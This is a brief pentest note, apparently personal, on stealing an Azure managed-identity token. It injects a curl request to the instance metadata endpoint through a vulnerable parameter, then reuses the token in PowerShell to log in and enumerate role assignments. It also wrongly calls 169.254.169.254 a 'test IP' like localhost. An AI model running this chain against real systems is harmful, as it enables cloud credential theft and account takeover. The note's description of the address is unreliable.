
Check for vulnerable input parameters in the asset, where you could inject payloads like:

```
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

==Remember that 169.254.169.254 is a test IP that works as a localhost in the cloud.==

This payload can retrieve metadata of the endpoint, and obtain an authentication token. If you do, then you will need to use the Powershell cli to connect to the endpoint:

`PS> $token = “AccessToken”
`PS> Connect-AzAccount -AccessToken $token -AccountId [Subscription ID]`

You can further expand your knowledge on the token using this site:
https://jwt.io/
It will break down the information about it.

Once you are logged in with the token, you can check the role assignment of a managed identity attached to the VM:

`Get-AzRoleAssignment -ObjectId [PrincipalID-ManagedIdentity]`




### Properties
---
📆 created   {{08-01-2025}} 21:17
🏷️ tags: #cloud #azure 

---

